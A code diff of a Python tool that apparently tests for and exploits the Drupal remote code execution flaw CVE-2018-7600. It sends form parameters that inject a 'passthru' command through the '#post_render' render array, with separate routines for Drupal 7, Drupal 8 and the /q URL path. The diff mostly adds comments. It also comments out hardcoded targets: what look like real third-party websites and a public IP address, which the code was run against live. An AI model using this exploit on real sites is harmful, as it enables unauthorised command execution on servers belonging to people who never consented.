@@ -2,11 +2,7 @@ import requests
 import re
 import bb01_ultilities as ulti
 
-# Fuction to check if the exploited form is avaiable
-# - RETURN:
-#     True: if the form can be connected
-#     False: if the form can be connected
-#     newURL -> string: if the form is redirected to other
+
 
 
 def processRedirectedURL(url,version):
@@ -43,6 +39,11 @@ def processRedirectedURL(url,version):
     
     return False
 
+# Fuction to check if the exploited form/url is avaiable
+# - RETURN:
+#     cleanURL en/disable: if the form can be connected
+#     False: if the form can't be connected
+#     'Redirected' + newURL -> string: if the form is redirected to other
 def isFormValid(host, version):
     if(host[-1:] != '/'): host+= '/'
     form_id = 'user/password' if version[:1] == '7' else 'user/register'
@@ -66,6 +67,10 @@ def isFormValid(host, version):
 
     return False
 
+# Fuction to check if the /q url can be exploited
+# - RETURN:
+#     True: can exploit
+#     False: can't exploit or Exception
 def isPwnAbleWithQ(host):
     signature = ulti.genSignature()
     get_params = {'q': 'user/password', 'name[#post_render][]': 'passthru',
@@ -93,6 +98,10 @@ def isPwnAbleWithQ(host):
     else:
         return False
 
+# Fuction to check if can be exploited for Drupal ver 7 with clean URL
+# - RETURN:
+#     True: can exploit
+#     False: can't exploit or Exception
 def exploitD7Clean(host):
     signature = ulti.genSignature()
     if(host[-1:] != '/'): host+= '/'
@@ -125,6 +134,10 @@ def exploitD7Clean(host):
     else:
         return False
 
+# Fuction to check if can be exploited for Drupal ver 8 with clean URL
+# - RETURN:
+#     True: can exploit
+#     False: can't exploit or Exception
 def exploitD8(host):
     signature = ulti.genSignature()
     url = ulti.genURLD8(host)
@@ -144,6 +157,11 @@ def exploitD8(host):
     else:
         return False
 
+
+# Fuction to check if can be exploited for Drupal with clean URL
+# - RETURN:
+#     True: can exploit
+#     False: can't exploit or Exception
 def isPwnAbleClean(host, version):
     if version == '7':
         return exploitD7Clean(host)
@@ -154,7 +172,12 @@ def isPwnAbleClean(host, version):
     else: 
         return False
 
-
+# Fuction: Process testing
+# - RETURN:
+#     isPwnAbleClean: result test for clean URL
+#     isPwnAbleWithQ: result test for /q URL
+#     processRedirectedURL: result test for redirected url
+#     False: Can't connect to form/url
 def isVuln(host, version):
     version = version[:1]
     formStatus = isFormValid(host, version)
@@ -172,6 +195,10 @@ def isVuln(host, version):
     else:
         return False
 
+# Fuction: call for module mode
+# - RETURN:
+#     True: Triggered
+#     False: Can't connect to form/url or exception
 def check_CVE_7600(host, version):
     try:
         res = isVuln(host, version)
@@ -181,17 +208,17 @@ def check_CVE_7600(host, version):
     return res
 
 
-host = 'http://lythuyetlaixe.com/'
-host = 'http://paradise-mass.lviv.ua/'
-# host = 'http://192.168.210.133'
-# # # host = 'https://whatchareadin.de'
-# # # host = 'http://autoshares.com/'
-version = '7.44'
+# host = 'http://lythuyetlaixe.com/'
+# host = 'http://paradise-mass.lviv.ua/'
+# host = 'http://68.183.237.96/'
+# # # # host = 'https://whatchareadin.de'
+# # # # host = 'http://autoshares.com/'
+# version = '7.44'
 # version = '8.2'
-# # # ver = '8.2'
-# # print 'Testing: ', host
-# # print '=' * 25
-print isVuln(host,version)
-# # formStatus = isFormValid(host,version)
-# # if('Redirected' in formStatus):
-# #     print 'Redirected'
+# # # # ver = '8.2'
+# print 'Testing: ', host
+# print '=' * 25
+# print check_CVE_7600(host,version)
+# # # formStatus = isFormValid(host,version)
+# # # if('Redirected' in formStatus):
+# # #     print 'Redirected'
